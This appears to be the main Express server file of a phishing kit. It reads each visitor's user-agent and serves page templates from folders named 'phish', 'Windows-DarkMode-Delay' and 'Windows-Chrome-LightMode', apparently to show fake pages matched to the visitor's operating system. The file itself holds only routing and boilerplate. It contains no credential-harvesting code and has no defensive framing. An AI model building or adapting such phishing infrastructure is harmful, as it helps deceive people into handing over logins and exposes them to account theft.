var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var useragent = require('useragent');

var indexRouter = require('./routes/index');
var usersRouter = require('./routes/pages');

var app = express();

// view engine setup
app.use('/', (req, res, next) => {

  ua = useragent.parse(req.headers['user-agent']) // true
 // console.log(ua.os)
  if (ua.os.family === 'Windows')
  {
    // console.log(ua.os)
    app.set('views', [ 

      path.join(__dirname, 'views/Windows-DarkMode-Delay'),
      path.join(__dirname, 'views/phish'), 
      path.join(__dirname, 'views/Windows-Chrome-LightMode')
      
      ]);
  }
  else {
    // console.log("na here we dey");
    app.set('views', [
      path.join(__dirname, 'views/Windows-DarkMode-Delay/mobile'),
      path.join(__dirname, 'views/phish'),

    ]);
    
  }
  
    next();
  });



app.set('view engine', 'hbs');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public/')));

app.use('/', indexRouter);
app.use('/page', usersRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('..\\error');
});

module.exports = app;
